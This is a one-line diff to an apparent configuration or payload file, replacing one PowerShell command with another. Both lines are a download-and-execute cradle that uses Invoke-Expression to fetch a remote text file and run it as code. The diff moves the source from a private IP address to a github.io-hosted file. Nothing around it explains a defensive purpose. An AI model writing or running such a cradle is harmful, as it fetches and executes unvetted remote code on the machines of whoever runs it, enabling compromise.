@@ -1,1 +1,1 @@
-"powershell.exe ""IEX ((new-object net.webClient).downloadString('http://192.168.6.204/imagedb.txt'))"""
+"powershell.exe ""IEX ((new-object net.webClient).downloadString('https://gydo194.github.io/imagedb.txt'))"""
